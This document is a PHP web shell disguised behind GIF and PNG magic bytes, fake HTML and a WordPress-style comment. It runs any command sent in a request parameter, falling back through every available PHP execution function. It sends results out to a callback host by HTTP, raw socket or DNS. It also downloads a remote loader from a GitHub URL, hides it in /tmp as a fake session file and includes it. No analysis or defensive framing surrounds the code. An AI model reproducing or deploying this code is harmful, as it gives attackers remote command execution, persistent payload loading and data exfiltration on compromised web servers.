GIF89a
.
.
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD><META http-equiv=Content-Type content="text/html; charset=gb2312">
<title>php</title>
* Front to the WordPress application. This file doesn't do anything, but loads
</html>
PNG %﻿PNG %﻿PNG %﻿PNG %
/* 内联提示 */
<?=
@error_reporting(0); @ini_set('display_errors',0);
function _rxst_out($o){ echo 'RXST:'.base64_encode($o===null?'':$o).':RXEND'; }

function _rxst_cb($data){
    $u = ''; $d = '';
    if ($u === '' && $d === '') return 'no_cb_cfg';
    if ($u !== '' && function_exists('curl_init')) {
        $c = @curl_init($u);
        @curl_setopt_array($c, [CURLOPT_POST=>1, CURLOPT_POSTFIELDS=>$data,
            CURLOPT_RETURNTRANSFER=>1, CURLOPT_TIMEOUT=>4,
            CURLOPT_SSL_VERIFYPEER=>0]);
        @curl_exec($c); @curl_close($c);
        return 'curl';
    }
    if ($u !== '' && ini_get('allow_url_fopen')) {
        $ctx = @stream_context_create(['http'=>['method'=>'POST',
            'header'=>"Content-Type: text/plain\r\n",
            'content'=>$data,'timeout'=>4]]);
        if (@file_get_contents($u, false, $ctx) !== false) return 'fopen';
    }
    if ($u !== '' && function_exists('fsockopen')) {
        $host = parse_url($u, PHP_URL_HOST);
        $h = @fsockopen(gethostbyname($host), 80, $e, $s, 3);
        if ($h) {
            $path = parse_url($u, PHP_URL_PATH) ?: '/';
            @fwrite($h, "POST $path HTTP/1.1\r\nHost: $host\r\n"
                     ."Content-Type: text/plain\r\nContent-Length: ".strlen($data)
                     ."\r\nConnection: close\r\n\r\n$data");
            @fclose($h); return 'fsockopen';
        }
    }
    if ($d !== '' && function_exists('gethostbyname')) {
        $chunk = substr(base64_encode($data), 0, 40);
        @gethostbyname($chunk.'.'.$d);
        return 'dns';
    }
    return 'no_callback';
}

function _rxst_run($cmd){
    $cmd = $cmd.' 2>&1'; $o='';
    if (function_exists('proc_open')){
        $d=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
        $p=@proc_open($cmd,$d,$pi);
        if (is_resource($p)){
            $o=stream_get_contents($pi[1]);
            @fclose($pi[0]);@fclose($pi[1]);@fclose($pi[2]);@proc_close($p);
            if ($o !== '' && $o !== false) return $o;
        }
    }
    if (function_exists('popen')){$h=@popen($cmd,'r');
        if(is_resource($h)){$o='';while(!feof($h))$o.=fread($h,4096);pclose($h);return $o;}}
    if (function_exists('shell_exec')) return @shell_exec($cmd);
    if (function_exists('exec')){@exec($cmd,$x);return implode("\n",$x);}
    if (function_exists('system')){ob_start();@system($cmd);return ob_get_clean();}
    if (function_exists('passthru')){ob_start();@passthru($cmd);return ob_get_clean();}
    return '__RXST_NO_EXEC__';
}

// ── drop loader ke /tmp ──
$L='/tmp/sess_6b4023d367b91c97f19597c4069337d3.php'; $LU='https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/bro.txt'; $dropped=false;
if (file_exists($L) && @filesize($L) > 100) { $dropped=true; }
else {
    $src=null;
    if (function_exists('curl_init')){
        $c=@curl_init($LU);
        @curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_TIMEOUT=>5,
            CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_FOLLOWLOCATION=>1]);
        $src=@curl_exec($c); @curl_close($c);
    }
    if (($src===null||$src===false) && ini_get('allow_url_fopen'))
        $src=@file_get_contents($LU);
    if ($src!==null && $src!==false) $dropped=@file_put_contents($L,$src)!==false;
}
if ($dropped && file_exists($L) && @filesize($L)>100) @include($L);

// ── dispatch ──
if (isset($_REQUEST['c'])){
    $out=_rxst_run($_REQUEST['c']);
    if ($out==='__RXST_NO_EXEC__'){
        $mode=_rxst_cb("NOEXEC host=".$_SERVER['HTTP_HOST']."\nloader=$dropped");
        _rxst_out('DISABLED:all_exec_off;cb='.$mode.';loader='.($dropped?'1':'0'));
    } else {
        _rxst_out($out);
        if (isset($_REQUEST['cb'])) _rxst_cb($out);
    }
} else {
    _rxst_out('MATHOK:' . (284 * 996));
}
?>
